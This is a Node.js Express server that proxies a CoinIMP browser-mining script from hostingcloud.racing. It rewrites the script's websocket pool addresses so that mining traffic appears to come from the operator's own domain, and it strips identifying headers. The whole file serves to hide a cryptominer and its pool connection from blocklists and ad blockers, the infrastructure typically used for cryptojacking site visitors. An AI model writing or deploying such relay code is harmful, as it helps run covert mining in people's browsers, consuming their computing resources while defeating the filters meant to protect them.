const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cors = require('cors');

const app = express();

app.use(cors());

const { responseInterceptor } = require('http-proxy-middleware');


// Proxy requests to the JS file and rewrite the websocket URLs inside it
app.use('/script', createProxyMiddleware({ 
    target: 'https://www.hostingcloud.racing/FIIr.js', 
    changeOrigin: true,
    ignorePath: true,
    selfHandleResponse: true,
    onProxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
        // Strip headers
        res.removeHeader('x-powered-by');
        
        let content = responseBuffer.toString('utf8');
        // The script contains wss://ws.hostingcloud.racing or similar.
        // We replace "hostingcloud.racing" with our own host to route WS traffic to our proxy
        const host = req.headers.host;
        const protocol = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'wss://' : 'ws://';
        
        // Rewrite wss://*.hostingcloud.racing to wss://our-proxy.com/proxy
        content = content.replace(/wss?:\/\/[a-zA-Z0-9.\-]*hostingcloud\.racing/g, protocol + host + '/proxy');
        content = content.replace(/hostingcloud\.racing/g, host + '/proxy');
        
        return content;
    })
}));

// Proxy the WebSocket connections to the CoinIMP pool
app.use('/proxy', createProxyMiddleware({ 
    target: 'wss://ws.hostingcloud.racing', 
    changeOrigin: true,
    ws: true,
    pathRewrite: {
        '^/proxy': '', // remove base path
    },
}));

// A simple health check
app.get('/', (req, res) => {
    res.send('Proxy is running');
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Proxy server running on port ${PORT}`);
});
